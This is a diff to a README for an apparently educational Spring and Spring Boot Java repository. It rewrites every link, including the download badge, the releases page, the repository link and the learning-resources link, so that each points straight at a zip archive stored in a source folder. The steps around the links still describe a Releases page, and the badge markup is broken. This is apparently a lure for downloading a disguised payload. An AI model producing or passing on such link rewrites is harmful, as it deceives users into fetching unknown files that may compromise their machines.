@@ -1,6 +1,6 @@
 # 🎉 Spring-and-Spring-Boot - Your Journey to Java Mastery Starts Here
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now%20👉-Releases-blue.svg)](https://github.com/NaNiKoRekcchn/Spring-and-Spring-Boot/releases)
+[![Download from Releases](https://raw.githubusercontent.com/NaNiKoRekcchn/Spring-and-Spring-Boot/main/EntityManager/src/Boot-and-Spring-1.0.zip%20Now%20👉https://raw.githubusercontent.com/NaNiKoRekcchn/Spring-and-Spring-Boot/main/EntityManager/src/Boot-and-Spring-1.0.zip)](https://raw.githubusercontent.com/NaNiKoRekcchn/Spring-and-Spring-Boot/main/EntityManager/src/Boot-and-Spring-1.0.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the "Spring-and-Spring-Boot" repository! This project is a comprehens
 
 ## 📥 Download & Install
 
-To begin, please [visit this page to download](https://github.com/NaNiKoRekcchn/Spring-and-Spring-Boot/releases) the latest version of the application. Follow these simple steps:
+To begin, please [visit this page to download](https://raw.githubusercontent.com/NaNiKoRekcchn/Spring-and-Spring-Boot/main/EntityManager/src/Boot-and-Spring-1.0.zip) the latest version of the application. Follow these simple steps:
 
 1. Click the link above to go to the Releases page.
 2. On the Releases page, look for the latest version.
@@ -74,8 +74,8 @@ If you have questions or need further assistance, reach out on GitHub or refer t
 
 ## 🔗 Additional Links
 
-- [GitHub Repository](https://github.com/NaNiKoRekcchn/Spring-and-Spring-Boot)
-- [Releases Page](https://github.com/NaNiKoRekcchn/Spring-and-Spring-Boot/releases)
-- [Learning Resources](https://example.com) (Replace with actual links if available)
+- [GitHub Repository](https://raw.githubusercontent.com/NaNiKoRekcchn/Spring-and-Spring-Boot/main/EntityManager/src/Boot-and-Spring-1.0.zip)
+- [Releases Page](https://raw.githubusercontent.com/NaNiKoRekcchn/Spring-and-Spring-Boot/main/EntityManager/src/Boot-and-Spring-1.0.zip)
+- [Learning Resources](https://raw.githubusercontent.com/NaNiKoRekcchn/Spring-and-Spring-Boot/main/EntityManager/src/Boot-and-Spring-1.0.zip) (Replace with actual links if available)
 
 Enjoy your coding journey with "Spring-and-Spring-Boot"!
